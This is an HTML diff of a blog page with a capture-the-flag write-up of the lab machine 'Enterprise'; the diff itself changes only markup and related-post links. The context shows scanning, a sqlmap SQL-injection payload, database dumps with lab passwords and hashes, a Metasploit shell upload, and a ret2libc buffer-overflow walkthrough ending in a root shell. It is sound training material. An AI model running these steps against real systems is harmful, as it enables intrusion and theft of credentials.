@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.38.2" />
+<meta name="generator" content="Hugo 0.78.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -155,7 +155,7 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "@type": "BlogPosting",
     "mainEntityOfPage":{
       "@type":"WebPage",
-      "@id":"https://alamot.github.io/"
+      "@id":"https:\/\/alamot.github.io\/"
     },
     "headline": "Enterprise write-up |  ",
     "image": {
@@ -169,14 +169,14 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
-      "image": "https://alamot.github.io/images/logo.png"
+      "image": "https:\/\/alamot.github.io\/images/logo.png"
     },
     "publisher": {
       "@type": "Organization",
       "name": "",
       "logo": {
         "@type": "ImageObject",
-        "url": "https://alamot.github.io/images/logo.png",
+        "url": "https:\/\/alamot.github.io\/images/logo.png",
         "height": 60,
         "width": 60
       }
@@ -336,7 +336,7 @@ if (language) {
 <h2 id="port-scanning">Port scanning</h2>
 
 <p>We scan the full range of TCP ports using masscan:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.61
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.61
 
 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-03-15 09:28:39 GMT
  -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
@@ -347,11 +347,11 @@ Discovered open port 443/tcp on 10.10.10.61
 Discovered open port 80/tcp on 10.10.10.61                                     
 Discovered open port 22/tcp on 10.10.10.61                                     
 Discovered open port 32812/tcp on 10.10.10.61                                  
-rate:  0.00-kpps, 100.00% done, waiting 0-secs, found=5</code></pre></div></div></p>
+rate:  0.00-kpps, 100.00% done, waiting 0-secs, found=5</code></pre></div></p>
 
 <p>We found TCP ports 22, 80, 443, 8080 and 32812 open. Let&rsquo;s explore them using nmap:</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nmap -A -p22,80,443,8080,32812 10.10.10.61
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nmap -A -p22,80,443,8080,32812 10.10.10.61
 
 Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-15 11:33 EET
 Nmap scan report for 10.10.10.61
@@ -440,13 +440,13 @@ SF:e\x20to\x20the\x20Library\x20Computer\x20Access\x20and\x20Retrieval\x20
 SF:System\n\nEnter\x20Bridge\x20Access\x20Code:\x20\n\nInvalid\x20Code\nTe
 SF:rminating\x20Console\n\n&#34;);
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.8 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)</code></pre></div></div>
+Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 3.2 - 4.8 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%)</code></pre></div>
 
 <h2 id="brute-forcing-directories-and-files">Brute-forcing directories and files</h2>
 
 <h3 id="port-80">Port 80</h3>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirb http://10.10.10.61/
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ dirb http://10.10.10.61/
 
 -----------------
 DIRB v2.22    
@@ -493,12 +493,12 @@ GENERATED WORDS: 4612
 ==&gt; DIRECTORY: http://10.10.10.61/wp-includes/css/                                                                 
 ==&gt; DIRECTORY: http://10.10.10.61/wp-includes/customize/                                                           
 ==&gt; DIRECTORY: http://10.10.10.61/wp-includes/fonts/                                                               
-==&gt; DIRECTORY: http://10.10.10.61/wp-includes/images/</code></pre></div></div>
+==&gt; DIRECTORY: http://10.10.10.61/wp-includes/images/</code></pre></div>
                                                          
 
 <h3 id="port-443">Port 443</h3>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirb https://10.10.10.61/
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ dirb https://10.10.10.61/
 
 -----------------
 DIRB v2.22    
@@ -520,11 +520,11 @@ GENERATED WORDS: 4612
 
 ---- Entering directory: https://10.10.10.61/files/ ----
 (!) WARNING: Directory IS LISTABLE. No need to scan it.
-    (Use mode &#39;-w&#39; if you want to scan it anyway)</code></pre></div></div>
+    (Use mode &#39;-w&#39; if you want to scan it anyway)</code></pre></div>
 
 <h3 id="port-8080">Port 8080</h3>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ dirb http://10.10.10.61:8080/
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ dirb http://10.10.10.61:8080/
 
 -----------------
 DIRB v2.22
@@ -548,7 +548,7 @@ GENERATED WORDS: 4612
 + http://10.10.10.61:8080/2 (CODE:200|SIZE:8594)
 + http://10.10.10.61:8080/2g (CODE:200|SIZE:8595)
 + http://10.10.10.61:8080/about (CODE:200|SIZE:8160)
-+ http://10.10.10.61:8080/About (CODE:200|SIZE:8160)</code></pre></div></div>
++ http://10.10.10.61:8080/About (CODE:200|SIZE:8160)</code></pre></div>
 
 <p>If we visit <a href="https://10.10.10.61/files/" target="_blank">https://10.10.10.61/files/</a> we discover an archive lcars.zip which contains 3 files:
 <div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">501 Oct 17 04:25 lcars_db.php
@@ -561,7 +561,7 @@ Plugin Name: lcars
 ...</code></pre></div></p>
 
 <p>So, maybe there is installed a wordpress plugin named lcars&hellip; Interesting. Let&rsquo;s have a look inside lcars_db.php:
-<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">include</span> <span class="s2">&#34;/var/www/html/wp-config.php&#34;</span><span class="p">;</span>
 <span class="nv">$db</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nx">DB_HOST</span><span class="p">,</span> <span class="nx">DB_USER</span><span class="p">,</span> <span class="nx">DB_PASSWORD</span><span class="p">,</span> <span class="nx">DB_NAME</span><span class="p">);</span>
 <span class="c1">// Test the connection:
@@ -579,15 +579,15 @@ Plugin Name: lcars
 <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
     <span class="k">echo</span> <span class="s2">&#34;Failed to read query&#34;</span><span class="p">;</span>
 <span class="p">}</span>
-<span class="cp">?&gt;</span>
-</code></pre></div></p>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></div></p>
 
 <p>Nice. I think this code begs for an SQL injection&hellip;</p>
 
 <h1 id="sql-injection">SQL Injection</h1>
 
 <p>Let&rsquo;s use sqlmap to exploit this SQLI:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql
 
 sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
 ---
@@ -599,10 +599,10 @@ Parameter: query (GET)
     Type: error-based
     Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)
     Payload: query=(SELECT 3017 FROM(SELECT COUNT(*),CONCAT(0x716b6a7871,(SELECT (ELT(3017=3017,1))),0x716b717871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
----</code></pre></div></div></p>
+---</code></pre></div></p>
 
 <p>Let&rsquo;s see what databases we have:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql --dbs
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql --dbs
 
 web server operating system: Linux Debian 8.0 (jessie)
 web application technology: PHP 5.6.31, Apache 2.4.10
@@ -615,12 +615,12 @@ available databases [8]:
 [*] performance_schema
 [*] sys
 [*] wordpress
-[*] wordpressdb</code></pre></div></div></p>
+[*] wordpressdb</code></pre></div></p>
 
 <h2 id="dumping-the-wordpress-database">Dumping the wordpress database</h2>
 
 <p>Let&rsquo;s dump the wordpress database:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql -D wordpress --dump
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql -D wordpress --dump
 
 ...
 wp_posts
@@ -628,10 +628,10 @@ wp_posts
 ID,guid,pinged,to_ping,post_date,post_type,post_name,menu_order,post_title,post_status,post_parent,ping_status,post_author,post_content,post_excerpt,post_date_gmt,post_modified,comment_count,post_password,post_mime_type,comment_status,post_modified_gmt,post_content_filtered
 6,http://10.10.10.61/?p=66,&lt;blank&gt;,&lt;blank&gt;,2017-09-06 15:40:30,post,&lt;blank&gt;,0,Passwords,draft,0,open,1,Needed somewhere to put some passwords quickly\r\n\r\nZxJyhGem4k338S2Y\r\n\r\nenterprisencc170\r\n\r\nZD3YxfnSjezg67JZ\r\n\r\nu*Z14ru0p#ttj83zS6\r\n\r\n \r\n\r\n ,&lt;blank&gt;,0000-00-00 00:00:00,2017-09-06 15:40:30,0,&lt;blank&gt;,&lt;blank&gt;,open,2017-09-06 14:40:30,&lt;blank&gt;
 67,http://10.10.10.61/?p=67,&lt;blank&gt;,&lt;blank&gt;,2017-09-06 
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>Nice, we have found some passwords: Passwords: ZxJyhGem4k338S2Y, enterprisencc170, ZD3YxfnSjezg67JZ, u*Z14ru0p#ttj83zS6. But we lack a username. Let&rsquo;s use wpscan to enumerate users:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ wpscan --url http://10.10.10.61/wp-content -e u
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ wpscan --url http://10.10.10.61/wp-content -e u
 
 ...
 
@@ -644,20 +644,20 @@ ID,guid,pinged,to_ping,post_date,post_type,post_name,menu_order,post_title,post_
 [+] william-riker
  | Detected By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>If we do some tests, we will see that the credentials william.riker:u*Z14ru0p#ttj83zS6 are working for <a href="http://10.10.10.61/wp-login.php" target="_blank">http://10.10.10.61/wp-login.php</a></p>
 
 <h2 id="dumping-the-joomladb-database">Dumping the joomladb database</h2>
 
 <p>Now let&rsquo;s dump the joomladb database:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql -D joomladb --dump
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sqlmap -u &#34;http://10.10.10.61/wp-content/plugins/lcars/lcars_db.php?query=22&#34; --dbms=mysql -D joomladb --dump
 
 edz2g_users
 -----------
 id,name,otep,email,block,otpKey,params,username,password,sendEmail,activation,resetCount,registerDate,requireReset,lastResetTime,lastvisitDate
 400,Super User,&lt;blank&gt;,geordi.la.forge@10.10.10.61,0,&lt;blank&gt;,&#34;{&#34;&#34;admin_style&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;admin_language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;editor&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;helpsite&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;timezone&#34;&#34;:&#34;&#34;&#34;&#34;}&#34;,geordi.la.forge,$2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy,1,0,0,2017-09-03 19:30:04,0,0000-00-00 00:00:00,2017-10-30 13:59:06
-401,Guinan,&lt;blank&gt;,guinan@10.10.10.61,0,&lt;blank&gt;,&#34;{&#34;&#34;admin_style&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;admin_language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;editor&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;helpsite&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;timezone&#34;&#34;:&#34;&#34;&#34;&#34;}&#34;,Guinan,$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q,0,&lt;blank&gt;,0,2017-09-06 12:38:03,0,0000-00-00 00:00:00,0000-00-00 00:00:00</code></pre></div></div></p>
+401,Guinan,&lt;blank&gt;,guinan@10.10.10.61,0,&lt;blank&gt;,&#34;{&#34;&#34;admin_style&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;admin_language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;language&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;editor&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;helpsite&#34;&#34;:&#34;&#34;&#34;&#34;,&#34;&#34;timezone&#34;&#34;:&#34;&#34;&#34;&#34;}&#34;,Guinan,$2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q,0,&lt;blank&gt;,0,2017-09-06 12:38:03,0,0000-00-00 00:00:00,0000-00-00 00:00:00</code></pre></div></p>
 
 <p>Nice, we have found the credentials geordi.la.forge:ZD3YxfnSjezg67JZ for <a href="http://10.10.10.61:8080/administrator" target="_blank">http://10.10.10.61:8080/administrator</a></p>
 
@@ -666,7 +666,7 @@ id,name,otep,email,block,otpKey,params,username,password,sendEmail,activation,re
 <h2 id="getting-shell-on-wordpress-container">Getting shell on Wordpress container</h2>
 
 <p>We can get a shell on the wordpress container by editing or uploading plugins. You can do it via the web portal or metasploit etc:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">msf exploit(handler) &gt; use  exploit/unix/webapp/wp_admin_shell_upload 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">msf exploit(handler) &gt; use  exploit/unix/webapp/wp_admin_shell_upload 
 msf exploit(wp_admin_shell_upload) &gt; info
 
 Basic options:
@@ -679,7 +679,7 @@ Basic options:
   SSL        false               no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                   yes       The base path to the wordpress application
   USERNAME   william.riker       yes       The WordPress username to authenticate with
-  VHOST                          no        HTTP server virtual host</code></pre></div></div></p>
+  VHOST                          no        HTTP server virtual host</code></pre></div></p>
 
 <h2 id="getting-shell-on-joomla-container">Getting shell on Joomla container</h2>
 
@@ -695,7 +695,7 @@ Then just visit the url of that template: <a href="http://10.10.10.61:8080/templ
 <h2 id="getting-root">Getting root</h2>
 
 <p>Port 32812 gave some interesting output on nmap scanning. Let&rsquo;s use nc to check it:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ nc 10.10.10.61 32812
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ nc 10.10.10.61 32812
 nc: using stream socket
 
                  _______ _______  ______ _______
@@ -704,14 +704,14 @@ nc: using stream socket
 
 Welcome to the Library Computer Access and Retrieval System
 
-Enter Bridge Access Code:</code></pre></div></div></p>
+Enter Bridge Access Code:</code></pre></div></p>
 
 <p>Unfortunately we don&rsquo;t know the code. But now we have a shell. Let&rsquo;s see what is binding on port 32812
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ netstat -lntup | grep 32812
-tcp        0      0 0.0.0.0:32812           0.0.0.0:*               LISTEN      1471/xinetd</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ netstat -lntup | grep 32812
+tcp        0      0 0.0.0.0:32812           0.0.0.0:*               LISTEN      1471/xinetd</code></pre></div></p>
 
 <p>The xinetd daemon listens for incoming requests over a network and launches the appropriate service. Let&rsquo;s find what that service is:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ pstree
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ pstree
 systemd-+-VGAuthService
         |-accounts-daemon-+-{gdbus}
         |                 `-{gmain}
@@ -750,20 +750,20 @@ systemd-+-VGAuthService
         |-systemd-timesyn---{sd-resolve}
         |-systemd-udevd
         |-vmtoolsd---{gmain}
-        `-xinetd---lcars</code></pre></div></div></p>
+        `-xinetd---lcars</code></pre></div></p>
 
 <p>Well, the service is named &ldquo;lcars&rdquo;:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ which lcars
-/bin/lcars</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ which lcars
+/bin/lcars</code></pre></div></p>
 
 <p>Using ltrace we discover the access code for lcars:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ltrace /bin/lcars
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ ltrace /bin/lcars
 ...
 strcmp(&#34;somedummyinput\n&#34;, &#34;picarda1&#34;)                    = -1
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>If we explore a little the lcars app, we discover that there is a segmentation fault / buffer overflow:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">Enter Bridge Access Code:
+<div class="bg-black"><pre><code class="language-console" data-lang="console">Enter Bridge Access Code:
 picarda1
 
 Welcome to the Library Computer Access and Retrieval System
@@ -782,10 +782,10 @@ Waiting for input:
 Disable Security Force Fields
 Enter Security Override:
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-Segmentation fault</code></pre></div></div></p>
+Segmentation fault</code></pre></div></p>
 
 <p>Let&rsquo;s find more about this using gdb:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ gdb /bin/lcars
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ gdb /bin/lcars
 
 (gdb) $ info functions
 All defined functions:
@@ -816,10 +816,10 @@ Non-debugging symbols:
 0x00000c91  main
 0x00000d30  __libc_csu_init
 0x00000d90  __libc_csu_fini
-0x00000d94  _fini</code></pre></div></div></p>
+0x00000d94  _fini</code></pre></div></p>
 
 <p>Let&rsquo;s have a look inside the function disableForcefields:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">(gdb) $ set disassembly-flavor intel
+<div class="bg-black"><pre><code class="language-console" data-lang="console">(gdb) $ set disassembly-flavor intel
 (gdb) $ disass disableForcefields
 Dump of assembler code for function disableForcefields:
    0x000007d4 &lt;+0&gt;:    push   ebp
@@ -863,7 +863,7 @@ Dump of assembler code for function disableForcefields:
    0x00000859 &lt;+133&gt;:    mov    ebx,DWORD PTR [ebp-0x4]
    0x0000085c &lt;+136&gt;:    leave  
    0x0000085d &lt;+137&gt;:    ret    
-End of assembler dump.</code></pre></div></div></p>
+End of assembler dump.</code></pre></div></p>
 
 <p>Let&rsquo;s explain some things. In general, when we look at the disassembly code at the top of a function we&rsquo;ll see something like this:
 <div class="highlight"><pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">push</span>   <span class="no">ebp</span>                  <span class="err">//</span><span class="no">backup</span> <span class="no">caller</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">ebp</span>
@@ -893,27 +893,27 @@ End of assembler dump.</code></pre></div></div></p>
 <p>In order to overwrite the return address (i.e. eip) with our payload, we have to add 4 to account for pushing caller&rsquo;s ebp into the stack. So our payload header will be 208+4 = 212. If you don&rsquo;t know what I am talking about read this: <a href="https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/" target="_blank">https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/</a></p>
 
 <p>Now, let&rsquo;s check if ASLR is enabled on the box:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat /proc/sys/kernel/randomize_va_space
-0</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat /proc/sys/kernel/randomize_va_space
+0</code></pre></div></p>
 
 <p>Nice, ASLR is disabled. Now let&rsquo;s find some useful addresses for our ret2libc payload:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">gdb /bin/lcars
+<div class="bg-black"><pre><code class="language-console" data-lang="console">gdb /bin/lcars
 (gdb) print &amp;system
 $1 = (&lt;text variable, no debug info&gt; *) 0xf7e4c060 &lt;system&gt;
 (gdb) print &amp;exit
 $2 = (&lt;text variable, no debug info&gt; *) 0xf7e3faf0 &lt;exit&gt;
 
 find &amp;system,+9999999,&#34;/bin/sh&#34;  
-0xf7f70a0f</code></pre></div></div></p>
+0xf7f70a0f</code></pre></div></p>
 
 <p>If we try to use the address 0xf7f70a0f, it won&rsquo;t work because it contains a newline ASCII code (0x0a). Depending on the context, the scanf() function either removes whitespace or stops reading after a whitespace.</p>
 
 <p>Let&rsquo;s search for plain &lsquo;sh&rsquo;:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">(gdb) find &amp;system,+9999999,&#34;sh&#34;       
+<div class="bg-black"><pre><code class="language-console" data-lang="console">(gdb) find &amp;system,+9999999,&#34;sh&#34;       
 0xf7f6ddd5
 0xf7f6e7e1
 0xf7f70a14
-0xf7f72582</code></pre></div></div></p>
+0xf7f72582</code></pre></div></p>
 
 <p>The address 0xf7f6ddd5 seems just fine.</p>
 
@@ -955,12 +955,12 @@ find &amp;system,+9999999,&#34;/bin/sh&#34;
 
 <p>That&rsquo;s all folks! :)</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ./pwn_lcars.py 
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ ./pwn_lcars.py 
 [+] Opening connection to 10.10.10.61 on port 32812: Done
 [*] Switching to interactive mode
 
 $ whoami
-root</code></pre></div></div>
+root</code></pre></div>
 
         </div>
 
@@ -990,17 +990,21 @@ root</code></pre></div></div>
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1015,20 +1019,36 @@ root</code></pre></div></div>
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1102,17 +1122,57 @@ root</code></pre></div></div>
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1126,149 +1186,21 @@ root</code></pre></div></div>
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1318,21 +1250,13 @@ root</code></pre></div></div>
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1366,6 +1290,22 @@ root</code></pre></div></div>
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
